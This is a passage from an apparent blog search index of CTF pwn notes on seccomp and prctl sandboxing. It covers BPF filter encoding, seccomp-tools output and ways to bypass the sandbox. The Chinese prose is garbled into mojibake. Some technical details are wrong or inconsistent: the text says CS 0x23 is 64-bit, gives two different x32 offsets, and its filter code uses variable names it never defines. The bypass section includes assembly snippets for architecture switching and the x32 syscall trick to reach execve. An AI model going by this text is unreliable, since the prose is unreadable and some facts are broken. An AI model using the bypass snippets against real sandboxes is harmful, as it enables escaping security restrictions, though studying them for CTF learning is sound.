0x8000\n```\n\nflagsçš„é«˜16ä½ä¸º_IO_MAGICï¼ŒåŸºæœ¬å›ºå®šï¼Œç”±libcç¡®å®šï¼Œä¸åŒç‰ˆæœ¬å¯èƒ½æœ‰å·®å¼‚ã€‚åé¢ä½16ä½åˆ†åˆ«å¯¹åº”ä¸åŒçš„è¡¨ç¤ºã€‚\n\nå¯å¾—æœ€ç»ˆçš„flagsåº”è¯¥ä¸º0xFBAD1800ï¼Œå…¶å®ä¹Ÿä¸ä¸€å®šéå¾—æ˜¯è¿™ä¸ªå€¼ï¼Œåªè¦æ»¡è¶³ä»¥ä¸Šæ‰€åˆ—çš„æ¡ä»¶å³å¯ï¼š\n\nf->flag & 0xa00 and f->flag & 0x1000 == 1ä»¥åŠf->write_base != f->write_ptr\n\næœ€åè®¾ç½®_IO_write_baseæŒ‡å‘æƒ³è¦æ³„éœ²çš„ä½ç½®ï¼Œ_IO_write_ptræŒ‡å‘æ³„éœ²ç»“æŸçš„ä½ç½®å³å¯ã€‚\n\nâ–²è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯_IO_CURRENTLY_PUTTINGæ ‡å¿—ä½åœ¨ç¨‹åºå·²ç»æœ‰æ‰“å°è¿‡ä¸œè¥¿çš„æƒ…å†µä¸‹å°±å·²ç»æ˜¯1äº†ï¼Œæ²¡æœ‰æ‰“å°è¿‡åˆ™ä¸º0ã€‚\n\n \n\n \n","tags":["pwn-Skill"],"categories":["PWN"]},{"title":"Seccomp_Before","url":"/2021/08/19/Seccomp_Before/","content":"\n1.å¸¸è§Seccompï¼š\n\n(1)åº“å®‰è£…ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\napt install libseccomp-dev libseccomp2 seccomp\n```\n\n(2)æ­£å¸¸çš„ä½¿ç”¨seccopmå¼€å¯ï¼š\n\nâ‘ å…ˆåˆ›å»ºåˆå§‹åŒ–scmp_filter_ctxç»“æ„ä½“ï¼Œå¹¶ä¸”ç»™å®šåˆå§‹è§„åˆ™ï¼š\n\nscmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);\n\nè¿™é‡Œå°†åˆå§‹è§„åˆ™è®¾ç½®ä¸ºSCMP_ACT_ALLOWï¼Œå³å…è®¸æ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨ã€‚å¦æœ‰è§„åˆ™å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n/**\n* Kill the process\n*/\n#define SCMP_ACT_KILL_PROCESS 0x80000000U\n/**\n* Kill the thread\n*/\n#define SCMP_ACT_KILL_THREAD 0x00000000U\n/**\n* Kill the thread, defined for backward compatibility\n*/\n#define SCMP_ACT_KILL SCMP_ACT_KILL_THREAD\n/**\n* Throw a SIGSYS signal\n*/\n#define SCMP_ACT_TRAP 0x00030000U\n/**\n* Notifies userspace\n*/\n#define SCMP_ACT_NOTIFY 0x7fc00000U\n/**\n* Return the specified error code\n*/\n#define SCMP_ACT_ERRNO(x) (0x00050000U | ((x) & 0x0000ffffU))\n/**\n* Notify a tracing process with the specified value\n*/\n#define SCMP_ACT_TRACE(x) (0x7ff00000U | ((x) & 0x0000ffffU))\n/**\n* Allow the syscall to be executed after the action has been logged\n*/\n#define SCMP_ACT_LOG 0x7ffc0000U\n/**\n* Allow the syscall to be executed\n*/\n#define SCMP_ACT_ALLOW 0x7fff0000U\n\n/* SECCOMP_RET_USER_NOTIF was added in kernel v5.0. */\n#ifndef SECCOMP_RET_USER_NOTIF\n#define SECCOMP_RET_USER_NOTIF 0x7fc00000U\n```\n\nâ‘¡æ·»åŠ è§„åˆ™ï¼Œå³æ·»åŠ ç™½åå•æˆ–è€…é»‘åå•ï¼š\n\nseccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);\n\nè¿™é‡Œå°†ç³»ç»Ÿè°ƒç”¨execveç»™ç¦æ­¢äº†ã€‚å‡½æ•°åŸå‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n/**\n* Add a new rule to the filter\n* @param ctx the filter context\n* @param action the filter action\n* @param syscall the syscall number\n* @param arg_cnt the number of argument filters in the argument filter chain\n* @param ... scmp_arg_cmp structs (use of SCMP_ARG_CMP() recommended)\n*\n* This function adds a series of new argument/value checks to the seccomp\n* filter for the given syscall; multiple argument/value checks can be\n* specified and they will be chained together (AND'd together) in the filter.\n* If the specified rule needs to be adjusted due to architecture specifics it\n* will be adjusted without notification. Returns zero on success, negative\n* values on failure.\n*\n*/\nint seccomp_rule_add(scmp_filter_ctx ctx,\nuint32_t action, int syscall, unsigned int arg_cnt, ...);\n```\n\nå³(ç»“æ„ä½“ï¼Œè§„åˆ™ï¼Œè§„åˆ™ç”Ÿæ•ˆçš„ç³»ç»Ÿè°ƒç”¨ï¼Œarg_cntï¼Œscmp_arg_cmp)ã€‚\n\nA.å…¶ä¸­arg_cntè¡¨ç¤ºå‡½æ•°seccomp_rule_addåé¢ä¼ å…¥å‚æ•°çš„ä¸ªæ•°ï¼Œå¦‚æœä¸º0ï¼Œåˆ™ç›´æ¥ç¦æ­¢execveï¼Œåé¢çš„scmp_arg_cmpéƒ½ä¸ç”¨èµ‹å€¼ï¼Œèµ‹å€¼äº†ä¹Ÿæ²¡ç”¨ã€‚\n\nB.å¦‚æœä¸ä¸º0ï¼Œåˆ™å†çœ‹ä¹‹åseccomp_rule_addå‡½æ•°ä¹‹åä¼ å…¥çš„å‚æ•°ï¼Œèµ‹å€¼ä¸º1ï¼Œåˆ™åªå…è®¸ä¸€æ¡è§„åˆ™ã€‚èµ‹å€¼ä¸º2ï¼Œåˆ™éœ€åŒæ—¶æ»¡è¶³ä¹‹åçš„ä¸¤æ¡è§„åˆ™æ‰ä¼šç”Ÿæ•ˆã€‚ä¾‹å¦‚ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n//ä»0å¼€å§‹è®¡ç®—å‚æ•°ä¸ªæ•°\nseccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),1,\n        SCMP_A2(SCMP_CMP_EQ,0x10));\nwrite(1,\"1234567812345678\",0x10);//è¢«æ‹¦æˆª\n\nseccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),2,\n        SCMP_A2(SCMP_CMP_EQ,0x10));\nwrite(1,\"1234567812345678\",0x10);//ä¸è¢«æ‹¦æˆª\n//seccomp_rule_addå‚æ•°ä¸ªæ•°è®¾ç½®ä¸º2ï¼Œä½†æ˜¯åç»­æ²¡æœ‰æ·»åŠ è§„åˆ™ï¼Œåˆ™é»˜è®¤ä¸æ»¡è¶³ï¼Œåˆ™ä¸ä¼šç”Ÿæ•ˆ\n\nseccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),2,\n        SCMP_A2(SCMP_CMP_EQ,0x10),SCMP_A0(SCMP_CMP_EQ,1));\nwrite(1,\"1234567812345678\",0x10);//è¢«æ‹¦æˆª\n\nseccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(write),2,\n        SCMP_A2(SCMP_CMP_EQ,0x10),SCMP_A0(SCMP_CMP_EQ,1));\nwrite(1,\"1234567812345678\",0x10);//ä¸è¢«æ‹¦æˆª\n```\n\nä½†æ˜¯ä½¿ç”¨seccompï¼Œä¸€æ—¦è¢«æ‹¦æˆªï¼Œåˆ™ç¨‹åºç›´æ¥æ‰“å°é”™è¯¯ä¿¡æ¯å¹¶ä¸­æ–­ï¼Œæ— æ³•æ‰§è¡Œä¹‹åçš„ä»£ç ï¼Œè§„åˆ™å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n/**\n* Specify an argument comparison struct for use in declaring rules\n* @param arg the argument number, starting at 0\n* @param op the comparison operator, e.g. SCMP_CMP_*\n* @param datum_a dependent on comparison\n* @param datum_b dependent on comparison, optional\n*/\n#define SCMP_CMP(...) ((struct scmp_arg_cmp){__VA_ARGS__})\n\n/**\n* Specify an argument comparison struct for argument 0\n*/\n#define SCMP_A0(...) SCMP_CMP(0, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 1\n*/\n#define SCMP_A1(...) SCMP_CMP(1, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 2\n*/\n#define SCMP_A2(...) SCMP_CMP(2, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 3\n*/\n#define SCMP_A3(...) SCMP_CMP(3, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 4\n*/\n#define SCMP_A4(...) SCMP_CMP(4, __VA_ARGS__)\n\n/**\n* Specify an argument comparison struct for argument 5\n*/\n#define SCMP_A5(...) SCMP_CMP(5, __VA_ARGS__)\n\n/**\n* Comparison operators\n*/\nenum scmp_compare {\n_SCMP_CMP_MIN = 0,\nSCMP_CMP_NE = 1, /**< not equal */\nSCMP_CMP_LT = 2, /**< less than */\nSCMP_CMP_LE = 3, /**< less than or equal */\nSCMP_CMP_EQ = 4, /**< equal */\nSCMP_CMP_GE = 5, /**< greater than or equal */\nSCMP_CMP_GT = 6, /**< greater than */\nSCMP_CMP_MASKED_EQ = 7, /**< masked equality */\n_SCMP_CMP_MAX,\n};\n\n/**\n* Argument datum\n*/\ntypedef uint64_t scmp_datum_t;\n\n/**\n* Argument / Value comparison definition\n*/\nstruct scmp_arg_cmp {\nunsigned int arg; /**< argument number, starting at 0 */\nenum scmp_compare op; /**< the comparison op, e.g. SCMP_CMP_* */\nscmp_datum_t datum_a;\nscmp_datum_t datum_b;\n};\n```\n\nâ‘¢å¯ç”¨seccompä¿æŠ¤ï¼š\n\nseccomp_load(ctx);\n\nåˆ©ç”¨seccomp_loadå‡½æ•°åŠ è½½å¯ç”¨ä¿æŠ¤ã€‚å‡½æ•°åŸå‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n/**\n* Return the notification fd from a filter that has already been loaded\n* @param ctx the filter context\n*\n* This returns the listener fd that was generated when the seccomp policy was\n* loaded. This is only valid after seccomp_load() with a filter that makes\n* use of SCMP_ACT_NOTIFY.\n*\n*/\nint seccomp_notify_fd(const scmp_filter_ctx ctx);\n```\n\nè¿™é‡Œä¼ å…¥scmp_filterç»“æ„ä½“å³å¯ï¼Œå¦‚æœä¸ä¼ å…¥\n\nä»¥ä¸Šçš„å‡å¯åœ¨seccomp.hä¸­æŸ¥çœ‹ã€‚\n\nâ–²æ€»çš„è°ƒç”¨å°±æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nscmp_filter_ctx ctx;\nctx = seccomp_init(SCMP_ACT_ALLOW);\nseccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);\nseccomp_load(ctx);\n```\n\nè®°å¾—å¼•ç”¨åº“ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#include <seccomp.h>\n#include <linux/seccomp.h>\n```\n\n \n\n2.Prtctlå‡½æ•°(/usr/includ/linux/prctl.h)ï¼š\n\nåŸå‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nint prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);\n```\n\nè¿™é‡Œçš„å‚æ•°å¯ä»¥ä¸éœ€è¦å…¨éƒ¨è®¾ç½®ä¸Šï¼Œå…¶ä¸­optionæ¯”è¾ƒå…³é”®ï¼Œåœ¨PWNä¸­å¤§è‡´åˆ†ä»¥ä¸‹æƒ…å†µï¼š\n\n(1)è‹¥optionä¸ºPR_SET_NO_NEW_PRIVS(38)ï¼š\n\næ­¤æ—¶å°†ç¬¬äºŒä¸ªå‚æ•°arg2è®¾ç½®ä¸º1ï¼Œé‚£ä¹ˆç¨‹åºçš„å­çº¿ç¨‹å°±æ— æ³•é€šè¿‡execveæ¥ææƒï¼Œå°±æ˜¯pwn kernelä¸­å³ä½¿æ”¹æ‰äº†credç»“æ„ä½“ï¼Œä½¿å…¶ç‰¹æƒä¸º0ï¼Œå†æ‰§è¡Œsystem(\"/bin/sh\")ä¾ç„¶æ— æ³•ææƒã€‚å³prctl(38, 1,0,0,0)è¡¨ç¤ºç¦ç”¨ç³»ç»Ÿè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯systemå’Œonegadgetéƒ½æ²¡äº†ï¼ŒåŒæ—¶å­è¿›ç¨‹ä¹Ÿæ— æ³•è¿™æ ·æ¥è·å¾—shellã€‚\n\n(2)è‹¥optionä¸ºPR_SET_SECCOMP(22)ï¼š\n\næ­¤æ—¶å¯ä»¥é€šè¿‡å‚æ•°æ¥è®¾ç½®è§„åˆ™ï¼Œé“ç†å’Œseccompä¸€æ ·çš„ï¼Œè§„åˆ™å¦‚ä¸‹ï¼š\n\nâ‘ å¦‚æœarg2ä¸ºSECCOMP_MODE_STRICT(1),åˆ™åªå…è®¸è°ƒç”¨read,write,_exit(è¿™ä¸ªexitä¸æ˜¯é€€å‡ºç¨‹åºçš„æ„æ€),sigreturnè¿™å‡ ä¸ªsyscallã€‚å³prctl(22,1,0,0,0)ã€‚\n\nâ‘¡å¦‚æœarg2ä¸ºSECCOMP_MODE_FILTER(2),åˆ™ä¸ºè¿‡æ»¤æ¨¡å¼,å…¶ä¸­å¯¹syscallçš„é™åˆ¶é€šè¿‡å‚æ•°3çš„ç»“æ„ä½“ï¼Œæ¥è‡ªå®šä¹‰è¿‡æ»¤è§„åˆ™ï¼Œå‡½æ•°ä¼šé‡å®šå‘åˆ°å¦ä¸€ä¸ªåŒåå‡½æ•°ï¼Œè¯¥å‡½æ•°çš„åŸå‹å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nint prctl(int PR_SET_SECCOMP,const struct* sock_filter SECCOMP_MODE_FILTER,const sock_fprog prog);\n```\n\nä½†è°ƒç”¨ä¹‹å‰è¿˜æ˜¯éœ€è¦ç¦ç”¨execveï¼Œå³è°ƒç”¨å½¢å¼ä¸ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nprctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);   //è¿™é‡Œæ˜¯éœ€è¦è¿™ä¹ˆå†™çš„\nprctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&sfp);\n```\n\nA.å‚æ•°SECCOMP_MODE_FILTERæ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œè¯¥sock_filterç»“æ„ä½“ä¸ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nstruct sock_filter { /* Filter block */\n__u16 code; /* Actual filter code */\n__u8 jt; /* Jump true */\n__u8 jf; /* Jump false */\n__u32 k; /* Generic multiuse field */\n};\n```\n\na.code:ä¸€ä¸ªå­—èŠ‚ï¼Œè¯¦ç»†å®šä¹‰æ“ä½œçš„ç±»å‹ï¼Œå‡è®¾codeä¸º0x15\n\nå…ˆçœ‹å‰å››ä½ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#define BPF_CLASS(code)\n#define BPF_LD 0x00 \n#define BPF_LDX 0x01\n#define BPF_ST 0x02\n#define BPF_STX 0x03\n#define BPF_ALU 0x04\n#define BPF_JMP 0x05\n#define BPF_RET 0x06\n#define BPF_MISC 0x07\n```\n\nè¿™é‡Œå‰å››ä½å°±æ˜¯0x5ï¼Œæ‰€ä»¥å¯¹åº”åˆ°ä¹‹åçš„å››ä½å®šä¹‰åŸŸä¸­å»ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n/*jmp fields */\n#define BPF_JA 0x00 \n#define BPF_JEQ 0x10\n#define BPF_JGT 0x20\n#define BPF_JGE 0x30\n#define BPF_JSET 0x40\n#define BPF_SRC(code) ((code) & 0x08)\n```\n\né‚£ä¹ˆè¿™ä¸ª0x15çš„æ“ä½œå°±æ˜¯BPF_JMP+BPF_JEQã€‚\n\nâ–²åŒç†ï¼Œldã€ldxã€ALUéƒ½æœ‰å¯¹åº”çš„å®šä¹‰åŸŸï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n/*ld fields */\n#define BPF_W 0x00\n#define BPF_H 0x08\n#define BPF_B 0x10\n\n/*ldx fields */  \n#define BPF_IMM 0x00\n#define BPF_ABS 0x20\n#define BPF_IND 0x40\n#define BPF_MEM 0x60\n#define BPF_LEN 0x80\n#define BPF_MSH 0xa0\n\n/*alu fields */\n#define BPF_ADD 0x00\n#define BPF_SUB 0x10\n#define BPF_MUL 0x20\n#define BPF_DIV 0x30\n#define BPF_OR 0x40\n#define BPF_AND 0x50\n#define BPF_LSH 0x60\n#define BPF_RSH 0x70\n#define BPF_NEG 0x80\n#define BPF_MOD 0x90\n#define BPF_XOR 0xa0\n\n/*å¸¸æ•°*/\n#define BPF_K 0x00\n#define BPF_X 0x08\n```\n\nè€ŒRETä¸€èˆ¬å¯¹åº”BPF_Kï¼Œç„¶ååœ¨ä¹‹åå‚æ•°ä¸Šå†™SECCOMP_RET_KILLæˆ–è€…SECCOMP_RET_ALLOWã€‚MISCå€’æ˜¯æ²¡è§è¿‡ã€‚\n\nb.JTå’ŒJFï¼šæ˜¯ç›¸å¯¹äºå½“å‰è¯­å¥çš„åç§»ã€‚ä¾‹å¦‚(1,0)ï¼Œå‡è®¾å½“å‰è¯­å¥ä¸º0003ï¼Œåˆ™ä»£è¡¨ä¹‹å‰è¯­å¥ä¸ºçœŸï¼Œåˆ™è·³è½¬åˆ°0005ï¼Œä¸ºå‡åˆ™è·³è½¬åˆ°0004ã€‚æ‰€ä»¥å¦‚æœéƒ½æ˜¯0ï¼Œç›¸å½“äºæ˜¯ä¸ªæ— è·³è½¬è¯­å¥ï¼Œå¦‚æœéƒ½æ˜¯1ï¼Œç›¸å½“äºæ˜¯è·³è¿‡ä¸‹ä¸€æ¡è¯­å¥ã€‚\n\nc.Kï¼šå¯ä»¥å½“ä½œä¸€ä¸ªå‚æ•°ã€‚å¦‚æœæ“ä½œè¯­å¥æ˜¯æ¯”è¾ƒï¼Œé‚£ä¹ˆå°±ç›¸å½“äºæ¯”è¾ƒçš„å³å€¼A>=Kï¼Ÿã€‚ä»¥æ­¤ç±»æ¨ã€‚è¿™ä¸ªå‚æ•°çš„å€¼æ˜¯ä»seccomp_dataä¸­ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n(<linux/audit.h> ) \nstruct seccomp_data {\nint nr; /* System call number */\n__u32 arch; /* AUDIT_ARCH_* value*/\n__u64 instruction_pointer; /* CPU instruction pointer */\n__u64 args[6]; /* Up to 6 system call arguments */\n};\n```\n\nå€¼å³ä»£è¡¨åç§»ï¼Œåç§»å­—é•¿ä¸ºä¸€ä¸ªå­—èŠ‚ï¼š\n\nK==0ï¼Œä»£è¡¨nrï¼›K==4ï¼Œä»£è¡¨archï¼›K==8ï¼Œä»£è¡¨args[0]ã€‚è€Œargså…­ä¸ªå€¼ç›¸å½“äºä¼ å‚å¯„å­˜å™¨çš„å€¼ï¼šebx,ecx,edx,esi,edi,ebp(32ä½)ï¼Œrdi,rsi,rdx,r10,r8,r9(64ä½)\n\nâ–²æ‰€ä»¥(0x15,0x00,0x01,0x0000003b)å°±ä»£è¡¨if (A!= execve) goto offset_1ã€‚è¿™é‡Œä¹Ÿå¯ä»¥ç”¨ä¸€ä¸ªç®€å•çš„æ“ä½œæ¥æ›¿ä»£ï¼šBPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1)ã€‚å®šä¹‰è§„åˆ™å°±å¯ä»¥å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nstruct sock_filter sfi[] = {\n{0x20,0x00,0x00,0x00000000},\n{0x15,0x00,0x01,0xc000003b},\n{0x06,0x00,0x00,0x00000000},   //KILL\n{0x06,0x00,0x00,0x7fff0000}   //ALLOW\n};\n```\n\næˆ–è€…\n\n```\n#æ³¨é‡Šå¤´\n\nstruct sock_filter filter[] = {\nBPF_STMT(BPF_LD+BPF_W+BPF_ABS,0), \nBPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1), \nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL), \nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW), \n};\n```\n\nç”±äºåœ¨/usr/include/linux/bpf_common.hæœ‰å®å®šä¹‰ï¼Œæ‰€ä»¥ç¬¬äºŒç§æƒ…å†µä¹Ÿæ˜¯å¯ä»¥çš„ã€‚\n\nB.sfpä¹Ÿæ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nstruct sock_fprog { /* Required for SO_ATTACH_FILTER. */\nunsigned short len; /* Number of filter blocks */\nstruct sock_filter *filter;\n};\n```\n\na.lenå³ä»£è¡¨è¯­å¥æ¡æ•°ï¼Œæ¯”å¦‚ä¸Šé¢çš„å°±æ˜¯4;\n\nb.filterå°±æ˜¯æŒ‡å‘ä¸Šé¢SECCOMP_MODE_FILTERè¿™ä¸ªç»“æ„ä½“çš„æŒ‡é’ˆã€‚\n\nâ–²æ‰€ä»¥å®Œæ•´çš„å°±æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nstruct sock_filter sfi[] = {\nBPF_STMT(BPF_LD+BPF_W+BPF_ABS,0),\nBPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1),\nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),\nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),\n};\nstruct sock_fprog sfp = {\n(unsigned short)(sizeof(filter)/sizeof(filter[0])),\nsfi,\n};\nprctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); \nprctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog);\n```\n\nè¿™æ ·è®¾ç½®åï¼Œå‡ºæ¥çš„æ•ˆæœå¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nroot@241adce81c0a:/ctf/seccomp# seccomp-tools dump ./prctl_test2\nline  CODE JT   JF   K\n=================================\n0000: 0x20 0x00 0x00 0x00000000 A = sys_number\n0001: 0x15 0x00 0x01 0x0000003b if (A != execve) goto 0003\n0002: 0x06 0x00 0x00 0x00000000 return KILL\n0003: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n```\n\n \n\n3.ç®€å•çš„seccompè§„åˆ™å†™ï¼š\n\n(1)ä¾æ®ç®€å•è¯­æ³•å†™è§„åˆ™ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nA = sys_number\nA == 257? e0:next\nA == 1? ok:next\nreturn ALLOW\ne0:\nreturn ERRNO(0)\nok:\nreturn ALLOW\n```\n\nä¿å­˜ä¸ºseccomp_asm\n\n(2)åˆ©ç”¨seccomp-toolsæ¥ç”Ÿæˆï¼š\n\nseccomp-tools asm seccomp_asm -f raw|seccomp-tools disasm -\n\n```\n#æ³¨é‡Šå¤´\n\nline  CODE JT   JF   K\n=================================\n0000: 0x20 0x00 0x00 0x00000000 A = sys_number\n0001: 0x15 0x02 0x00 0x00000101 if (A == openat) goto 0004\n0002: 0x15 0x02 0x00 0x00000001 if (A == write) goto 0005\n0003: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0004: 0x06 0x00 0x00 0x00050000 return ERRNO(0)\n0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n```\n\nè¿™æ ·å°±å¯ä»¥æ–¹ä¾¿å†™è§„åˆ™äº†ï¼ŒåŒæ ·æœ‰ä¸ªseccomp_bpf.hçš„ä¸œè¥¿ï¼Œæ¯”è¾ƒç®€å•ï¼š\n\n[secfilter/seccomp-bpf.h at master Â· ahupowerdns/secfilter Â· GitHub](https://github.com/ahupowerdns/secfilter/blob/master/seccomp-bpf.h)\n\n \n\n4.å¸¸è§ç§ç±»åŠç»•è¿‡æ–¹å¼ï¼š\n\n(1)ç¦ç”¨execveå‡½æ•°æ—¶ï¼Œä½†æ˜¯éœ€è¦getshellæ‰è¡Œï¼Œæ­¤æ—¶å­˜åœ¨æ»¡è¶³ä¸€å®šæ¡ä»¶å¯ä»¥ä½¿ç”¨shellcodeï¼š\n\nâ‘ æœªæ£€æŸ¥archï¼š\n\nå°è¯•ä½¿ç”¨shellcodeå°†å¤„ç†å™¨è½¬æ¢ï¼Œå¦‚æœæ˜¯x64åˆ™è½¬ä¸ºi386ï¼ŒåŒç†ç±»ä¼¼ã€‚è¿™æ ·ç³»ç»Ÿè°ƒç”¨å·11å°±ä¸ä¼šè¢«è§£æä¸º64ä½ä¸­çš„__x64_sys_munmapï¼Œè€Œæ˜¯32ä½ä¸­çš„sys_execveï¼Œç»•è¿‡æ£€æŸ¥ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nto32:\nmov DWORD [rsp+4],0x23;\nretf;\n\nto64:\nmov DWORD [esp+4],0x33; \nretf;\n```\n\nç”±äºretfçš„æŒ‡ä»¤å®é™…æ•ˆæœä¸ºï¼šPOP CS:EIPï¼Œè¿™é‡ŒCSä¸º0x23å³ä¸º64ä½ï¼Œ0x33å³ä¸º32ä½ï¼Œæ‰€ä»¥å¦‚æœèƒ½æ‰¾åˆ°æ§åˆ¶æ ˆçš„gadgeté‚£å…¶å®ä¹Ÿå¯ä»¥ç›´æ¥ç”¨retfï¼Œæ¯•ç«Ÿretfå…¶å®ä¹ŸæŒºå¸¸è§çš„ã€‚åŒæ—¶è¿˜æœ‰å…¶ä»–çš„å¥½ç”¨retæŒ‡ä»¤ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nRETQï¼šPOP RIP\nRETN: POP EIP\nRETF: POP CS:EIP\n```\n\nå‚è€ƒSCTF2020é‡Œé¢çš„CoolCode\n\nâ‘¡å­˜åœ¨æ£€æŸ¥æ¼æ´ï¼šif (A < 0x40000000)ï¼Œå¦‚æœå¯¹A >= 0x40000000æ²¡æœ‰é™åˆ¶ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨64ä½ä¸‹çš„x32æ¼æ´ï¼Œä½¿ç”¨ 64ä½çš„å­˜å™¨åœ°å€å’Œ 32ä½çš„åœ°å€ï¼š\n\nå…·ä½“åŸç†ä¸å¤ªæ‡‚ï¼Œåº”è¯¥æ˜¯ä¼ å‚åŸå› å§ï¼Œå¯èƒ½syscallçš„ç³»ç»Ÿè°ƒç”¨å·å¯„å­˜å™¨ä¸ºeaxï¼Œå¯¼è‡´ç³»ç»Ÿè°ƒç”¨å·0x40000003bç»•è¿‡if (A < 0x40000000)æ£€æŸ¥ï¼Œç„¶åä»¥eaxä¼ å…¥ç³»ç»Ÿè°ƒç”¨å·ä¸º0x0000003bï¼Œä»ç„¶æ‰§è¡Œäº†execveã€‚\n\nè¿™æ ·çš„è¯åœ¨åŸæ¥çš„ç³»ç»Ÿè°ƒç”¨å·åŠ ä¸Š0x400000000å³å¯ç»•è¿‡æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmov rax,59+0x40000000;\nsyscall;\n```\n\n(2)ç¦ç”¨evecveç­‰å‡½æ•°ï¼Œå‘Šè¯‰äº†flagä½ç½®ï¼Œæˆ–è€…å°†flagä½ç½®ä»€ä¹ˆçš„æ”¾åœ¨äº†æ ˆä¸Š(å¯ä»¥ç”¨pedaæ’ä»¶ï¼šfind flag)ï¼Œåˆæˆ–è€…éœ€è¦è‡ªå·±è°ƒè¯•çˆ†ç ´flagçš„ä½ç½®ï¼Œä¸èƒ½getshellçš„ï¼Œåˆ©ç”¨open,write,readç­‰æ²¡æœ‰è¢«ç¦ç”¨çš„å‡½æ•°è¿›è¡Œè¯»å–ï¼š\n\nâ‘ shellcodeæ¨¡å¼ï¼šè¿™é‡Œå°±æ ¹æ®å„ç§è§„åˆ™é™åˆ¶æ¥ç»•è¿‡ï¼Œè‡ªå·±ç¼–å†™shellcodeã€‚(è¿™ä¸ªéœ€è¦æ±‡ç¼–åŸºç¡€ï¼Œé‡åˆ°é¢˜ç›®æ…¢æ…¢å­¦å§)\n\nâ‘¡ROPæ¨¡å¼ï¼šä¸€èˆ¬éœ€è¦åŠ«æŒæ ˆå†æ¥ROPï¼Œå…¶å®å’Œshellcodeå·®ä¸å¤šçš„ã€‚è¿™ç§æƒ…å†µä¸€èˆ¬æ˜¯ç¦ç”¨äº†mprotectï¼Œæ‰€ä»¥æ²¡åŠæ³•ç›´æ¥ä½¿ç”¨shellcodeäº†ï¼Œé‚£ä¹ˆå°±åˆ©ç”¨ROPæ¥æï¼Œå€ŸåŠ©libcä¸Šçš„syscallã€‚ä½†æ˜¯è¿™é‡Œçš„openä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ‰æ—¶å€™æ‰§è¡Œä¸äº†ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å€ŸåŠ©syscallåŠ ä¸Šopençš„ç³»ç»Ÿè°ƒç”¨å·æ¥æ‰§è¡Œopenã€‚\n\nå¦‚æœæ²¡æœ‰ç¦æ­¢mprotectï¼Œé‚£ä¹ˆé€šå¸¸å¯ä»¥é…åˆSigreturnFrame()ï¼Œfree_hookï¼Œsetcontextæ¥å°†å †ä¸Šå†…å­˜æƒé™æ”¹ä¸ºå¯æ‰§è¡Œï¼Œç„¶åå†åœ¨å †ä¸Šä½¿ç”¨shellcodeä¹Ÿå¯ä»¥ã€‚\n\nâ–²æœ‰äº›ç¦ç”¨äº†open,write,readï¼Œé‚£ä¹ˆå…¶å®è¿™ç§æƒ…å†µä¸‹å¯ä»¥è°ƒç”¨å¯¹åº”çš„openatï¼Œreadvï¼Œå’Œwritevï¼Œå…¶å®æ•ˆæœä¸€æ ·çš„ï¼Œå› 